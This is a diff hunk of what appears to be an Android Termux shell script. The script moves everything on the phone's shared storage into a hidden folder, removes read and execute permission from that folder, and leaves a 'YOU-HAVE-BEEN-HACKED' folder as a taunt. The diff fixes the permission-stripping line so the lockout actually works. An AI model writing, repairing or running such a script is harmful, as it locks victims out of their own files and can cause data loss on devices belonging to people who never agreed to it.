@@ -2,7 +2,7 @@ pkg install termimage
 termux-setup-storage
 mkdir /$HOME/.rfkzk
 mv /sdcard/* /data/data/com.termux/files/home/.rfkzk
-$chmod u=w /$HOME/.rfkzk
+chmod u=w /$HOME/.rfkzk
 mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂
 chmod u=x *
 chmod u=rwx IMG-20240228-WA0000.jpg
